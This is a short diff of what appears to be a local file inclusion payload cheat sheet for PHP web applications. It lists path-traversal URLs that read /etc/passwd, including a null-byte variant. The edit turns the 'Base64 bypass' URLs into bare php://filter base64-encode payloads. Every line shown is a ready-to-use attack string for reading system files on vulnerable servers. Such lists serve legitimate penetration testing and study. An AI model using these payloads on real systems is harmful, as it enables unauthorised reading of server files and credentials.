@@ -24,8 +24,8 @@ https://example.com/index.php?page=../../../../etc/passwd
 https://example.com/index.php?page=../../../../etc/passwd%00
 
 - Base64 bypass
-https://example.com/index.php?page=php://filter/read=convert.base64-encode/resource=/etc/passwd  
-https://example.com/index.php?page=php://filter/read=convert.base64-encode/resource=./../../etc/passwd  
+php://filter/read=convert.base64-encode/resource=/etc/passwd
+php://filter/read=convert.base64-encode/resource=./../../etc/passwd  
 https://example.com/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd  
 https://example.com/index.php?page=php://filter/convert.base64-encode/resource=./../../etc/passwd  
 
